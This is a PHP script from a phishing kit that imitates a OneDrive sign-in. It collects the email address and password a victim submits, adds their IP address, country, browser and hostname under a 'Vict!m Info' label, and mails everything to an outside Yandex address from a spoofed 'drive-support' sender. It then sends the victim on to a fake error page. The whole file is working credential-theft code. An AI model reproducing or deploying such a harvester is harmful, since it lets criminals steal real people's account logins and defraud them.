<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Online Info-----------------------\n";
$message .= "Email:             : ".$_POST['jade']."\n"; 
$message .= "Password:             : ".$_POST['crakass']."\n"; 
$mind = $_POST['jade'];
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY Burhan-------------\n";
$send = "hk.blaze@yandex.com";
$subject = "Compani One Drive From $ip";
$headers = "From: Profile One Drive <drive-support@ikiekikloursh.com>";
$headers .= $_POST['slio']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
	
	   header("Location: error.php?email=$mind&source=page.landing_protected&locale=en_US&question_box=v8");

	 
?>